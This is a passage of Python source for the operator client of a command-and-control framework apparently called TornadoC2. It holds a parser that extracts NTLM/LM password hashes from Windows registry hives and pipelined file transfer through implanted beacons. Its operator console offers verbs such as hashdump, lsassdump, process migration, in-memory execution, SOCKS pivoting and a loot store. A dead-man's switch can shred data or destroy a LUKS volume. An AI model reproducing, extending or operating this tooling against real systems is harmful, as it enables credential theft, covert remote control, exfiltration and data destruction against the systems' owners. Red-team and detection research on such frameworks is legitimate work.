        has_lm = bool(lm) and lm != empty_lm
        if has_nt or has_lm:
            out.append({'user': who, 'domain': dom,
                        'lm': lm, 'ntlm': ntlm})

    return out


def _run_native_parser(sam_bytes, system_bytes):
    """Parse the hives in pure Python. Returns a list of
    {'user','domain','lm','ntlm'} dicts, or None on total
    failure."""
    try:
        parser = _NativeSamParser(sam_bytes, system_bytes)
    except Exception as exc:
        print(f"  {CLR['red']}native parser: {exc}{CLR['reset']}")
        return None

    out = []
    try:
        for _rid, uname, lm_hex, nt_hex in parser.dump():
            if nt_hex == \
                    '31d6cfe0d16ae931b73c59d7e0c089c0' and \
                    (not lm_hex or lm_hex ==
                     'aad3b435b51404eeaad3b435b51404ee'):
                continue
            out.append({
                'user': uname, 'domain': '',
                'lm': lm_hex, 'ntlm': nt_hex})
    except Exception as exc:
        print(f"  {CLR['red']}native parser error: {exc}"
              f"{CLR['reset']}")
        if not out:
            return None
    return out


# ---------------------------------------------------------------------
# Background file transfers

UPLOAD_CHUNK_SIZE    = 262144   # 256 KiB per chunk
DOWNLOAD_CHUNK_SIZE  = 262144   # 256 KiB per chunk
TRANSFER_QUEUE_DEPTH = 16       # chunks in flight at once
TRANSFER_DRAIN_WAIT  = 0.5      # long-poll wait per drain attempt


class _TransferJob:
    """A background file transfer.

    Runs in its own daemon thread. Pipelining keeps up to
    TRANSFER_QUEUE_DEPTH chunks in the beacon's task queue at all
    times, so the beacon is never idle waiting for the operator
    side to enqueue the next chunk. The operator prompt is never
    blocked: the job reports start, finish, and failure only —
    per-chunk progress is available on demand through `jobs`.

    Chunk size is 256 KiB rather than the historical 32 KiB. The
    beacon's per-task overhead (queue entry, poll, signature
    verify, result record) is the same regardless of payload, so
    8x fewer tasks is roughly 8x fewer round trips on a sleep-0
    beacon. Pipelining on top of that gives another large factor
    on any beacon whose sleep interval is non-zero, because the
    beacon drains its queue without waiting for us.
    """

    _counter = 0
    _counter_lock = threading.Lock()

    @classmethod
    def _next_id(cls):
        with cls._counter_lock:
            cls._counter += 1
            return f"t{cls._counter}"

    def __init__(self, client, direction, local_path, remote_path,
                 digest, size, beacon_id, no_loot=False):
        self.id = cls_id = _TransferJob._next_id()
        self.client = client
        self.direction = direction          # 'upload' | 'download'
        self.local_path = local_path
        self.remote_path = remote_path
        self.digest = digest                # local hash for upload,
                                            # remote hash for download
        self.size = size
        self.beacon_id = beacon_id
        self.no_loot = no_loot
        self.started = time.time()
        self.bytes_done = 0
        self.chunks_done = 0
        self.total_chunks = 0
        self._stop = threading.Event()
        self._thread = None

    # --- public control -------------------------------------------

    def start(self):
        self._thread = threading.Thread(
            target=self._run,
            name=f"transfer-{self.id}-{self.direction}",
            daemon=True)
        self._thread.start()

    def cancel(self):
        self._stop.set()

    def snapshot(self):
        return {
            'id':         self.id,
            'direction':  self.direction,
            'local':      self.local_path,
            'remote':     self.remote_path,
            'size':       self.size,
            'done':       self.bytes_done,
            'chunks':     self.chunks_done,
            'total':      self.total_chunks,
            'elapsed':    time.time() - self.started,
        }

    # --- worker ----------------------------------------------------

    def _run(self):
        try:
            if self.direction == 'upload':
                self._run_upload()
            else:
                self._run_download()
            self.client._transfer_done(self, success=True)
        except Exception as exc:
            self.client._transfer_done(
                self, success=False, error=str(exc))
        finally:
            self.client._transfers.pop(self.id, None)

    # --- primitive helpers ----------------------------------------

    def _enqueue(self, verb, args):
        """Post one task. Returns task_id, or None if the
        enqueue was refused (queue full, transport error)."""
        try:
            r = self.client.tp.post(
                f'/api/v1/beacon/{self.beacon_id}/task',
                {'verb': verb, 'args': args, 'timeout': 300},
                timeout=30.0)
        except Exception:
            return None
        return r.get('task_id')

    def _wait_for(self, task_id, deadline):
        """Block until a single task_id is ready, or the deadline
        passes. Returns the response dict or None."""
        while time.time() < deadline:
            if self._stop.is_set():
                return None
            try:
                r = self.client.tp.post(
                    f'/api/v1/beacon/{self.beacon_id}'
                    f'/result/{task_id}',
                    {'wait': 1.0}, timeout=15.0)
            except Exception:
                time.sleep(0.2)
                continue
            if r.get('ready'):
                return r
        return None

    def _drain_oldest(self, pending):
        """Poll the oldest pending task once. Beacons return
        results in FIFO order, so the oldest is the one most
        likely to be ready. Returns (task_id, response) or None.

        `pending` is a dict; Python 3.7+ preserves insertion
        order, and we always insert in enqueue order."""
        if not pending:
            return None
        tid = next(iter(pending))
        try:
            r = self.client.tp.post(
                f'/api/v1/beacon/{self.beacon_id}'
                f'/result/{tid}',
                {'wait': TRANSFER_DRAIN_WAIT}, timeout=15.0)
        except Exception:
            time.sleep(0.2)
            return None
        if r.get('ready'):
            return tid, r
        return None

    # --- upload ----------------------------------------------------

    def _run_upload(self):
        # Plan jittered chunk sizes up front so the sizes do not
        # depend on how the pipeline drains.
        low = max(4096, UPLOAD_CHUNK_SIZE // 2)
        plan = []
        remaining = self.size
        while remaining > 0:
            s = random.randint(low, UPLOAD_CHUNK_SIZE)
            if s > remaining:
                s = remaining
            plan.append(s)
            remaining -= s
        self.total_chunks = len(plan)

        # 1. Truncate the remote file.
        tid = self._enqueue('truncate', [self.remote_path])
        if not tid:
            raise RuntimeError('could not enqueue truncate')
        r = self._wait_for(tid, time.time() + 180)
        if r is None:
            raise RuntimeError('truncate timed out')
        if r.get('error'):
            raise RuntimeError(f'truncate: {r["error"]}')

        # 2. Pipelined chunk write.
        pending = {}          # task_id -> (idx, byte_len)
        next_chunk = 0
        with open(self.local_path, 'rb') as fh:
            while (next_chunk < len(plan) or pending) \
                    and not self._stop.is_set():
                # Fill the pipeline.
                while len(pending) < TRANSFER_QUEUE_DEPTH \
                        and next_chunk < len(plan):
                    want = plan[next_chunk]
                    block = fh.read(want)
                    if not block:
                        break
                    b64 = _b64.b64encode(block).decode('ascii')
                    tid = self._enqueue(
                        'writechunk', [b64, self.remote_path])
                    if tid is None:
                        # Queue full; back off and try again.
                        break
                    pending[tid] = (next_chunk, len(block))
                    next_chunk += 1

                ready = self._drain_oldest(pending)
                if ready is None:
                    if not pending and next_chunk >= len(plan):
                        break
                    continue
                tid, r = ready
                idx, blen = pending.pop(tid)
                if r.get('error'):
                    raise RuntimeError(
                        f'chunk {idx}: {r["error"]}')
                self.bytes_done += blen
                self.chunks_done += 1

        if self._stop.is_set():
            raise RuntimeError('cancelled')

        # 3. Verify remote SHA-256.
        tid = self._enqueue('sha256file', [self.remote_path])
        if not tid:
            raise RuntimeError('could not enqueue sha256file')
        r = self._wait_for(tid, time.time() + 180)
        if r is None:
            raise RuntimeError('verify timed out')
        remote_hex = _b64.b64decode(
            r.get('output') or '').decode(
            'ascii', errors='replace').strip()
        if remote_hex.lower() != self.digest.lower():
            raise RuntimeError(
                f'sha256 mismatch: local={self.digest[:16]}… '
                f'remote={remote_hex[:16]}…')

    # --- download --------------------------------------------------

    def _run_download(self):
        low = max(4096, DOWNLOAD_CHUNK_SIZE // 2)
        plan = []
        cursor = 0
        while cursor < self.size:
            s = random.randint(low, DOWNLOAD_CHUNK_SIZE)
            if cursor + s > self.size:
                s = self.size - cursor
            plan.append((cursor, s))
            cursor += s
        self.total_chunks = len(plan)

        # 1. Pipelined chunk read. Buffer results in memory,
        #    write once at the end. Reordering happens naturally
        #    because we key by chunk index, not by arrival order.
        results = {}
        pending = {}          # task_id -> (idx, offset, want)
        next_chunk = 0
        while (next_chunk < len(plan) or pending) \
                and not self._stop.is_set():
            while len(pending) < TRANSFER_QUEUE_DEPTH \
                    and next_chunk < len(plan):
                off, want = plan[next_chunk]
                tid = self._enqueue(
                    'readchunk',
                    [self.remote_path, str(off), str(want)])
                if tid is None:
                    break
                pending[tid] = (next_chunk, off, want)
                next_chunk += 1

            ready = self._drain_oldest(pending)
            if ready is None:
                if not pending and next_chunk >= len(plan):
                    break
                continue
            tid, r = ready
            idx, off, want = pending.pop(tid)
            if r.get('error'):
                raise RuntimeError(
                    f'chunk {idx}: {r["error"]}')
            data = _b64.b64decode(r.get('output') or '')
            results[idx] = data
            self.bytes_done += len(data)
            self.chunks_done += 1

        if self._stop.is_set():
            raise RuntimeError('cancelled')

        # 2. Write the file in chunk order.
        try:
            with open(self.local_path, 'wb') as fh:
                for i in range(len(plan)):
                    block = results.get(i)
                    if block is None:
                        raise RuntimeError(
                            f'missing chunk {i} in local buffer')
                    fh.write(block)
        except OSError as exc:
            raise RuntimeError(f'local write failed: {exc}')

        # 3. Verify both sides.
        h = hashlib.sha256()
        with open(self.local_path, 'rb') as fh:
            for block in iter(lambda: fh.read(1 << 20), b''):
                h.update(block)
        local_hex = h.hexdigest()

        tid = self._enqueue('sha256file', [self.remote_path])
        remote_hex = None
        if tid:
            r = self._wait_for(tid, time.time() + 180)
            if r is not None:
                remote_hex = _b64.b64decode(
                    r.get('output') or '').decode(
                    'ascii', errors='replace').strip()

        if remote_hex and remote_hex.lower() != local_hex.lower():
            raise RuntimeError(
                f'sha256 mismatch: local={local_hex[:16]}… '
                f'remote={remote_hex[:16]}…')

        # Refresh digest to the verified local hash, so the
        # completion line and the loot-store upload use the same
        # value.
        self.digest = local_hex


class _RestartRequired(BaseException):
    """Raised inside a command handler to signal that the client
    should stop so the operator can restart it with a freshly
    written config. Currently only raised after a self password
    change.

    Inherits from BaseException rather than Exception so the
    broad ``except Exception`` in ``_loop``'s dispatch does not
    swallow it and print a misleading ``error:`` line.
    """


# ---------------------------------------------------------------------
# Client

class Client:

    def __init__(self, cfg, transport, config_path=None):
        self.cfg = cfg
        self.tp = transport
        self.config_path = config_path
        self.name = cfg['name']
        self.role = cfg['role']
        self.caps = []
        self.current_beacon = None
        self._beacon_ids = []
        self._beacon_cache = []
        self._last_known_sleep = None
        self._socks_proxy = None
        self.client_tunnel_port = None
        self.quic_port = None
        self.server_version = '?'
        self._chat_dm_peer = None
        self._chat_last_topic = None
        self.commands = None
        self.command_categories = None
        self._client_ops_cache = None
        self._matches = []
        self._result_poller = None
        self._transfers = {}
        self._no_interactive = False
        self._setup_readline()

    # ------------------------------------------------------------------
    # Command catalogue

    def _load_commands(self, target_os=None):
        """Fetch the command catalogue for this operator's role.

        Called from banner() after /identify so the server knows
        who we are, and again from _cmd_use when the operator
        attaches to a beacon, so the catalogue reflects the
        target's OS (e.g. `bof` only for Windows beacons).

        On failure, leaves self.commands as None and the client
        uses the hardcoded FALLBACK_* lists.
        """
        payload = {}
        if target_os:
            payload['target_os'] = target_os
        try:
            r = self.tp.post('/api/v1/commands', payload)
        except Exception:
            return
        if not isinstance(r, dict):
            return
        if 'main' not in r or 'beacon' not in r:
            return
        self.commands = r
        self.command_categories = (r.get('categories') or {}).get(
            'beacon') or []
        self._client_ops_cache = None

    # --- Accessors ----------------------------------------------------

    def _verbs_for(self, scope):
        """Return the set of top-level verb names for the given
        scope, from the server catalogue or the fallback list."""
        if self.commands is None:
            if scope == 'main':
                return set(FALLBACK_META)
            return set(FALLBACK_BEACON)
        out = set()
        for entry in self.commands.get(scope, []):
            out.add(entry['name'])
            for alias in entry.get('aliases', []):
                out.add(alias)
        return out

    def _native_verbs(self):
        """Return the set of native verbs — the ones the client
        passes through to the beacon without shell wrapping."""
        if self.commands is None:
            return FALLBACK_NATIVE
        return frozenset(
            entry['name'] for entry in self.commands.get('beacon', [])
            if entry.get('native'))

    def _client_ops(self):
        """Return a dict name → client_op for verbs that carry a
        specialised client handler. Cached; the cache is invalidated
        by _load_commands whenever the catalogue is refetched."""
        if self._client_ops_cache is not None:
            return self._client_ops_cache
        if self.commands is None:
            return {
                # Transfer
                'upload': 'upload', 'download': 'download',
                # Credential collection
                'hashdump':  'hashdump',
                'lsassdump': 'lsassdump',
                # Token privileges
                'enablepriv': 'enablepriv',
                # Process migration
                'migrate': 'migrate',
                # Scripting
                'pyexec': 'script', 'psexec': 'script',
                'shexec': 'script', 'execmem': 'execmem',
                # Windows payloads
                'bof': 'bof',
                'execute-assembly': 'execute_assembly',
                # Pivoting
                'socks': 'socks',
                # Extensions
                'extension': 'extension',
                # Session tools
                'info': 'info',
                'graph': 'graph',
                'forget': 'forget',
                'detach': 'detach',
                'tasks': 'tasks',
                'wait': 'wait',
                'schedule': 'schedule',
            }
        out = {}
        for entry in self.commands.get('beacon', []):
            op = entry.get('client_op')
            if op:
                out[entry['name']] = op
        self._client_ops_cache = out
        return out

    # ------------------------------------------------------------------
    # Readline

    def _setup_readline(self):
        if not readline:
            return
        try:
            if 'libedit' in (readline.__doc__ or ''):
                readline.parse_and_bind('bind ^I rl_complete')
            else:
                readline.parse_and_bind('tab: complete')
        except Exception:
            pass
        readline.set_completer_delims(' \t\n')
        readline.set_history_length(500)
        readline.set_completer(self._complete)
        try:
            readline.read_history_file(HISTORY_FILE)
        except (OSError, IOError):
            pass

    def _save_history(self):
        if not readline:
            return
        try:
            readline.write_history_file(HISTORY_FILE)
        except (OSError, IOError):
            pass

    def _complete(self, text, state):
        if state == 0:
            self._matches = self._compute_matches(text)
        try:
            return self._matches[state]
        except IndexError:
            return None

    def _compute_matches(self, text):
        if not readline:
            return []
        buf = readline.get_line_buffer()
        begidx = readline.get_begidx()
        prefix = buf[:begidx]
        ends_space = prefix.endswith(' ') or prefix.endswith('\t')
        words = prefix.split()
        arg_i = len(words) if ends_space else len(words) - 1
        first = words[0].lower() if words else ''

        if arg_i == 1 and first == 'use':
            cands = set(self._beacon_ids)
            for b in getattr(self, '_beacon_cache', []):
                alias = b.get('alias') or ''
                if alias:
                    cands.add(alias)
            return sorted(c for c in cands
                          if c.startswith(text))

        if arg_i == 1 and first == 'audit':
            return sorted(s for s in AUDIT_SUBS
                          if s.startswith(text.lower()))

        if arg_i == 1 and first == 'deadman':
            caps = getattr(self, 'caps', []) or []
            if not any(c in caps for c in (
                    'deadman.view', 'deadman.arm', 'deadman.halt')):
                return []
            subs = ['status']
            if 'deadman.arm' in caps:
                subs.extend(['arm', 'arm-until', 'reset',
                             'disable', 'warn', 'halt', 'shred'])
            return sorted(s for s in subs
                          if s.startswith(text.lower()))

        if arg_i == 1 and first in ('loot', 'lootstore'):
            return sorted(
                s for s in ('list', 'get', 'upload',
                            'delete', 'help')
                if s.startswith(text.lower()))

        if arg_i == 1 and first == 'creds':
            return sorted(
                s for s in ('list', 'get', 'add', 'search',
                            'validate', 'delete')
                if s.startswith(text.lower()))

        if arg_i == 1 and first == 'notes':
            return sorted(
                s for s in ('search',)
                if s.startswith(text.lower()))

        if arg_i == 1 and first == 'webhooks':
            return sorted(
                s for s in ('list', 'add', 'remove', 'test')
                if s.startswith(text.lower()))

        if arg_i == 1 and first == 'note':
            return sorted(
                s for s in ('show', 'set', 'clear')
                if s.startswith(text.lower()))

        if arg_i == 1 and first == 'schedule':
            return sorted(
                s for s in ('add', 'list', 'remove', 'output')
                if s.startswith(text.lower()))

        if arg_i == 1 and first in ('operators', 'op'):
            return sorted(
                s for s in ('list', 'add', 'remove', 'set-role',
                            'passwd', 'export')
                if s.startswith(text.lower()))

        if arg_i == 1 and first in (
                'upload', 'download',
                'pyexec', 'psexec', 'shexec',
                'execmem', 'bof'):
            return self._complete_paths(text)

        if first == 'migrate':
            if arg_i == 1:
                return ['--self']
            for prev in words[2:]:
                if prev in ('--method', '--method=') \
                        or prev.startswith('--method='):
                    return sorted(
                        v for v in ('default', 'apc')
                        if v.startswith(text.lower()))
            if text.startswith('--'):
                return sorted(
                    v for v in ('--method', '--method=')
                    if v.startswith(text))
            return []

        if first == 'spawnto':
            if arg_i == 1 and text.startswith('-'):
                return sorted(
                    v for v in ('--clear',)
                    if v.startswith(text))
            return []

        if first == 'bofs' and arg_i >= 2 \
                and len(words) > 1 and words[1].lower() == 'add':
            return self._complete_paths(text)

        if first == 'extension':
            if arg_i == 1:
                return sorted(s for s in FALLBACK_EXTENSION_SUBS
                              if s.startswith(text.lower()))
            if arg_i == 2 and len(words) > 1 \
                    and words[1].lower() in ('info', 'call', 'unload'):
                return []
            if arg_i == 2 and len(words) > 1 \
                    and words[1].lower() == 'load':
                return self._complete_paths(text)

        if arg_i == 2 and first == 'curl' \
                and len(words) > 1 and words[1] == '-o':
            return self._complete_paths(text)

        if arg_i == 0:
            candidates = set(self._verbs_for('main'))
            candidates.add('lootstore')
            candidates.add('jobs')
            if self.current_beacon:
                candidates |= self._verbs_for('beacon')
            return sorted(c for c in candidates
                          if c.startswith(text.lower()))

        return []

    # ------------------------------------------------------------------
    # Banner

    def banner(self):
        r = self.tp.post('/api/v1/identify', {})
        self.name = r['name']
        self.role = r['role']
        self.caps = r['capabilities']
        self.client_tunnel_port = r.get('client_tunnel_port')
        self.quic_port = r.get('quic_port')
        self.beacon_port = r.get('beacon_port')
        self.server_version = r.get('server_version', '?')
        self._load_commands()

        c = CLR
        host = f"{self.cfg['server_host']}:{self.cfg['server_port']}"

        def kv(label, value, value_color=None):
            col = value_color or ''
            end = c['reset'] if col else ''
            print(f"  {c['dim']}{label:<10}{c['reset']}"
                  f"{col}{value}{end}")

        print()
        _hr(72, '=')
        print(f"  {c['bold']}{c['cyan']}TORNADOC2 OPERATOR CLIENT"
              f"{c['reset']}")
        _hr(72, '=')
        kv('server', host)
        kv('version', f"client 1.0.0  ·  server {self.server_version}")
        kv('operator', self.name, c['green'])
        kv('role', self.role,
           c['magenta'] if self.role == 'admin' else c['yellow'])

        caps = sorted(self.caps)
        if caps:
            joined = ', '.join(caps)
            if len(joined) <= 60:
                kv('caps', joined)
            else:
                kv('caps', caps[0])
                for cap in caps[1:]:
                    print(f"  {'':<10}{cap}")
        else:
            kv('caps', '(none)')

        if self.client_tunnel_port:
            kv('tunnel',
               f"port {self.client_tunnel_port} (SOCKS5 pivot)")

        _hr(72, '=')
        print(f"  {c['dim']}Type {c['reset']}help{c['dim']} for "
              f"the command index. "
              f"Ctrl-D or {c['reset']}exit{c['dim']} to "
              f"disconnect.{c['reset']}")
        print()

    # ------------------------------------------------------------------
    # Main loop

    def run(self):
        try:
            self._loop()
        finally:
            if self._result_poller is not None:
                try:
                    self._result_poller.stop()
                except Exception:
                    pass
            if self._socks_proxy is not None:
                try:
                    self._socks_proxy.stop()
                except Exception:
                    pass
            self._save_history()

    def _loop(self):
        while True:
            try:
                line = input(self._prompt()).strip()
            except KeyboardInterrupt:
                print()
                continue
            except EOFError:
                print()
                return

            if not line:
                continue

            parts = line.split()
            cmd = parts[0].lower()

            try:
                if cmd in ('exit', 'quit', 'q'):
                    return
                if cmd in ('help', '?'):
                    self._help()
                elif cmd in ('clear', 'cls'):
                    print('\033[2J\033[3J\033[H', end='', flush=True)
                elif cmd == 'killall':
                    self._cmd_killall(parts)
                elif cmd == 'history':
                    self._cmd_history(parts)
                elif cmd == 'jobs':
                    self._cmd_jobs(parts)
                elif cmd == 'build':
                    self._cmd_build(parts)
                elif cmd == 'recipes':
                    self._cmd_recipes(parts)
                elif cmd in ('c2-profiles', 'c2p'):
                    self._cmd_c2_profiles(parts)
                elif cmd == 'bofs':
                    self._cmd_bofs(parts)
                elif cmd in ('beacons', 'bl'):
                    self._cmd_beacons()
                elif cmd == 'use':
                    self._cmd_use(parts)
                elif cmd == 'detach':
                    self._cmd_detach()
                elif cmd == 'info' and not self.current_beacon:
                    self._cmd_info()
                elif cmd == 'caps':
                    self._cmd_caps()
                elif cmd == 'audit':
                    self._cmd_audit(parts)
                elif cmd == 'chat':
                    self._cmd_chat(parts)
                elif cmd in ('loot', 'lootstore'):
                    self._cmd_loot(parts)
                elif cmd == 'creds':
                    self._cmd_creds(parts)
                elif cmd == 'notes':
                    self._cmd_notes(parts)
                elif cmd == 'webhooks':
                    self._cmd_webhooks(parts)
                elif cmd == 'deadman':
                    self._cmd_deadman(parts)
                elif cmd == 'halt':
                    self._cmd_halt(parts)
                elif cmd == 'operators':
                    self._cmd_operators(parts)
                elif self.current_beacon:
                    self._cmd_beacon(parts)
                elif cmd in self._verbs_for('beacon'):
                    print(f"{CLR['yellow']}{cmd}{CLR['reset']}"
                          f"{CLR['dim']} is a beacon verb — attach "
                          f"first with `use <id>`{CLR['reset']}")
                else:
                    print(f"{CLR['red']}unknown command: {cmd}"
                          f"{CLR['reset']}"
                          f"{CLR['dim']} (try `help`) "
                          f"{CLR['reset']}")
            except _RestartRequired:
                print()
                print(f"{CLR['yellow']}restart required — the "
                      f"config was rewritten with the new "
                      f"password derivation.{CLR['reset']}")
                print(f"{CLR['dim']}start the client again with "
                      f"the same config path to continue."
                      f"{CLR['reset']}")
                return
            except KeyboardInterrupt:
                print(f"\n{CLR['yellow']}interrupted{CLR['reset']}")
            except Exception as exc:
                print(f"{CLR['red']}error: {exc}{CLR['reset']}")

    def _prompt(self):
        c = CLR

        def esc(s):
            if _COLOR and readline:
                return '\001' + s + '\002'
            return s

        if self.current_beacon:
            alive = None
            sleep_s = None
            for b in getattr(self, '_beacon_cache', []):
                if b['id'] == self.current_beacon:
                    alive = b.get('alive')
                    sleep_s = b.get('sleep_interval')
                    break

            if alive is True:
                state = f"{esc(c['green'])}●{esc(c['reset'])}"
            elif alive is False:
                state = f"{esc(c['red'])}○{esc(c['reset'])}"
            else:
                state = f"{esc(c['dim'])}·{esc(c['reset'])}"

            sleep_note = ''
            if sleep_s is not None:
                sleep_note = (f" {esc(c['dim'])}/{sleep_s}s"
                              f"{esc(c['reset'])}")

            return (
                f"{state} "
                f"{esc(c['cyan'])}{self.name}{esc(c['reset'])}"
                f"{esc(c['dim'])}@{esc(c['reset'])}"
                f"{esc(c['yellow'])}#{self.current_beacon}"
                f"{esc(c['reset'])}"
                f"{sleep_note} "
                f"{esc(c['green'])}›{esc(c['reset'])} "
            )
        return (
            f"{esc(c['green'])}{self.name}{esc(c['reset'])} "
            f"{esc(c['cyan'])}›{esc(c['reset'])} "
        )

    # ------------------------------------------------------------------
    # Meta commands

    def _help(self):
        """Render the command menu.

        Sections and entries come from the catalogue the server
        sent at banner time, filtered by the operator's role. If
        the server did not serve a catalogue (old server, or the
        call failed), fall back to a minimal static rendering so
        the operator still sees something useful.
        """
        c = CLR

        if self.commands is None:
            self._help_fallback()
            return

        # ---- Main scope ------------------------------------------------
        _header('SESSION')
        _NAME_W = 34
        for entry in self.commands.get('main', []):
            if entry.get('hidden'):
                continue
            name = entry['name']
            args = entry.get('args') or ''
            desc = entry.get('description') or ''
            aliases = entry.get('aliases') or []
            if aliases:
                name_col = f"{name} ({', '.join(aliases)})"
            else:
                name_col = name
            display = f"{name_col} {args}".rstrip()
            if len(display) <= _NAME_W:
                print(f"  {c['green']}{display:<{_NAME_W}}"
                      f"{c['reset']}  {desc}")
            else:
                print(f"  {c['green']}{display}{c['reset']}")
                print(f"  {'':<{_NAME_W}}  {desc}")

        # ---- Beacon scope ----------------------------------------------
        print()
        print(f"  {c['dim']}Once attached to a beacon, every line you "
              f"type is sent as a verb.{c['reset']}")
        print(f"  {c['dim']}Tab-completion covers every verb below."
              f"{c['reset']}")

        beacon_entries = [
            e for e in self.commands.get('beacon', [])
            if not e.get('hidden')
        ]

        by_cat = {}
        for entry in beacon_entries:
            cat = entry.get('category') or 'OTHER'
            by_cat.setdefault(cat, []).append(entry)

        try:
            term_w = os.get_terminal_size().columns
        except OSError:
            term_w = 80
        name_w = 34 if term_w >= 100 else 28

        for category in (self.command_categories or []):
            if category not in by_cat:
                continue
            print()
            _header(category)
            for entry in by_cat[category]:
                name = entry['name']
                args = entry.get('args') or ''
                desc = entry.get('description') or ''
                aliases = entry.get('aliases') or []
                if aliases:
                    name_col = f"{name} ({', '.join(aliases)})"
                else:
                    name_col = name
                display = f"{name_col} {args}".rstrip()
                if len(display) <= name_w:
                    print(f"  {c['cyan']}{display:<{name_w}}"
                          f"{c['reset']}  {desc}")
                else:
                    print(f"  {c['cyan']}{display}{c['reset']}")
                    print(f"  {'':<{name_w}}  {desc}")

        print()
        print(f"  {c['dim']}Native verb list: README.md › "
              f"Native Commands.{c['reset']}")
        print(f"  {c['dim']}Full operator reference: README.md › "
              f"Operator Reference.{c['reset']}")
        print()

    def _help_fallback(self):
        """Minimal help text when the server did not serve a
        catalogue. Prints whatever verbs the client was compiled
        with, plus a note to restart the server."""
        c = CLR
        print(f"{c['yellow']}server did not serve a command "
              f"catalogue — using the client's built-in list."
              f"{c['reset']}")
        print(f"{c['dim']}restart the team server to enable "
              f"role-filtered commands.{c['reset']}")
        print()

        _header('SESSION')
        for name in ('beacons', 'use <id>', 'detach', 'info',
                     'caps', 'audit', 'chat', 'loot', 'history',
                     'clear', 'build', 'c2-profiles', 'bofs',
                     'help', 'exit'):
            print(f"  {c['green']}{name}{c['reset']}")

        _header('ATTACHED BEACON')
        for name in sorted(FALLBACK_BEACON):
            print(f"  {c['cyan']}{name}{c['reset']}")
        print()

    @staticmethod
    def _complete_paths(text):
        """Complete a local filesystem path."""
        raw = os.path.expanduser(text or '')
        if raw.endswith(os.sep) or raw.endswith('/'):
            dirname, basename = raw, ''
        else:
            dirname, basename = os.path.split(raw)
        if not dirname:
            dirname = '.'
        if not os.path.isdir(dirname):
            return []
        matches = []
        try:
            for entry in sorted(os.listdir(dirname)):
                if entry.startswith(basename):
                    full = os.path.join(dirname, entry)
                    if os.path.isdir(full):
                        matches.append(full + os.sep)
                    else:
                        matches.append(full)
        except OSError:
            return []
        return matches
        
    # ------------------------------------------------------------------
    # Dead-man's switch (remote)

    def _cmd_deadman(self, parts):
        """deadman [status | arm <duration> | arm-until <HH:MM> |
                    reset <duration> | disable |
                    warn <f1,f2,...> |
                    halt <none|shutdown|reboot> |
                    shred <fast|random|dod|gutmann|nist|schneier
                           |hmg|bsi|crypto|scrub|trim>]"""
        c = CLR
        sub = parts[1].lower() if len(parts) > 1 else 'status'

        if sub == 'status' or sub == '':
            if not any(cap in self.caps for cap in (
                    'deadman.view', 'deadman.arm', 'deadman.halt')):
                print(f"{c['red']}your role does not include "
                      f"deadman.view{c['reset']}")
                return
            self._deadman_status()
            return

        if 'deadman.arm' not in self.caps:
            print(f"{c['red']}your role does not include "
                  f"deadman.arm{c['reset']}")
            return

        if sub in ('arm', 'on', 'enable'):
            if len(parts) < 3:
                print(f"{c['red']}usage: deadman arm "
                      f"<duration>{c['reset']}")
                return
            self._deadman_post('arm', {'duration': parts[2]})

        elif sub in ('arm-until', 'until'):
            if len(parts) < 3:
                print(f"{c['red']}usage: deadman arm-until "
                      f"<HH:MM>{c['reset']}")
                return
            self._deadman_post('arm-until', {'deadline': parts[2]})

        elif sub in ('reset', 'extend'):
            if len(parts) < 3:
                print(f"{c['red']}usage: deadman reset "
                      f"<duration>{c['reset']}")
                return
            self._deadman_post('reset', {'duration': parts[2]})

        elif sub in ('disable', 'off'):
            self._deadman_post('disable', {})

        elif sub == 'warn':
            if len(parts) < 3:
                print(f"{c['red']}usage: deadman warn "
                      f"<f1,f2,...>  (or 'none'){c['reset']}")
                return
            self._deadman_post('warn', {'fractions': parts[2]})

        elif sub == 'halt':
            if len(parts) < 3:
                print(f"{c['red']}usage: deadman halt "
                      f"<none|shutdown|reboot>{c['reset']}")
                return
            self._deadman_post('halt-mode', {'mode': parts[2]})

        elif sub == 'shred':
            if len(parts) < 3:
                print(f"{c['red']}usage: deadman shred "
                      f"<mode>{c['reset']}")
                print(f"  {c['dim']}pattern modes: "
                      f"fast random dod gutmann "
                      f"nist schneier hmg bsi{c['reset']}")
                print(f"  {c['dim']}structural modes: "
                      f"crypto scrub trim{c['reset']}")
                return
            mode = parts[2].strip().lower()
            payload = {'mode': mode}

            if mode == 'crypto':
                print(f"{c['red']}{c['bold']}crypto mode is "
                      f"destructive to the whole volume."
                      f"{c['reset']}")
                print(f"  {c['yellow']}If the tree sits on a LUKS "
                      f"volume that holds other data, running the "
                      f"switch will destroy that data too. The "
                      f"whole volume becomes unrecoverable the "
                      f"moment the LUKS header is erased."
                      f"{c['reset']}")
                try:
                    ans = input(
                        f"  {c['yellow']}Enable crypto mode? "
                        f"[y/N]{c['reset']} ").strip().lower()
                except (EOFError, KeyboardInterrupt):
                    print()
                    print(f"{c['dim']}cancelled{c['reset']}")
                    return
                if ans not in ('y', 'yes'):
                    print(f"{c['dim']}cancelled{c['reset']}")
                    return
                payload['confirm'] = True
            self._deadman_post('shred-mode', payload)

        elif sub in ('help', '?'):
            print(f"deadman status | arm <duration> | "
                  f"arm-until <HH:MM> | reset <duration> | "
                  f"disable | warn <f1,f2,...> | "
                  f"halt <mode> | shred <mode>")

        else:
            print(f"{c['red']}unknown deadman subcommand: {sub}"
                  f"{c['reset']}")

    def _deadman_status(self):
        c = CLR
        try:
            r = self.tp.post('/api/v1/deadman/status', {})
        except Exception as exc:
            print(f"{c['red']}deadman status failed: {exc}"
                  f"{c['reset']}")
            return
        if not r.get('ok'):
            print(f"{c['red']}{r.get('error', 'failed')}"
                  f"{c['reset']}")
            return
        s = r.get('status') or {}
        halt_mode = r.get('halt_mode', 'none')
        shred_mode = r.get('shred_mode', 'fast')
        if not s.get('enabled'):
            print(f"  {c['bold']}dead-man's switch{c['reset']}  "
                  f"{c['yellow']}disabled{c['reset']}")
            print(f"  {c['dim']}halt mode : {halt_mode}{c['reset']}")
            print(f"  {c['dim']}shred mode: {shred_mode}{c['reset']}")
            return
        print(f"  {c['bold']}dead-man's switch{c['reset']}  "
              f"{c['green']}armed{c['reset']}")
        print()

        def row(label, value, col=None):
            vcol = col or ''
            tail = c['reset'] if vcol else ''
            print(f"  {c['dim']}{label:<14}{c['reset']}"
                  f"{vcol}{value}{tail}")

        row('deadline', time.strftime(
            '%Y-%m-%d %H:%M:%S',
            time.localtime(s.get('deadline', 0))))
        row('window', self._fmt_seconds(s.get('window_seconds', 0)))
        row('elapsed', self._fmt_seconds(s.get('elapsed_secs', 0)))
        row('remaining',
            self._fmt_seconds(s.get('remaining_secs', 0)),
            col=(c['green']
                 if s.get('remaining_secs', 0) > 60
                 else c['red']))
        row('halt mode', halt_mode)
        row('shred mode', shred_mode)
